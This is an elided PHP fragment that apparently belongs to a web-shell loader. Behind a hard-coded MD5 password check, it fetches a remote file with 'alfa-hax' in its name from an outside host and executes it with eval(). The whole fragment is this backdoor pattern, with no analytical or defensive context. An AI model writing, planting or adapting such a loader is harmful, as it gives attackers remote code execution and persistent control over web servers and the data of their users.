...
if (isset($_POST['password'])) {
    ...
    $hashed_password = '139993a8a7610c0fa9c55412e2a8d4f5'; // Replace this with your MD5 hashed password
...
if (is_logged_in()) {
    $a = geturlsinfo('https://tokobuku.pages.dev./alfa-hax-raw-nopas.txt');
    eval('?>' . $a);
} else {
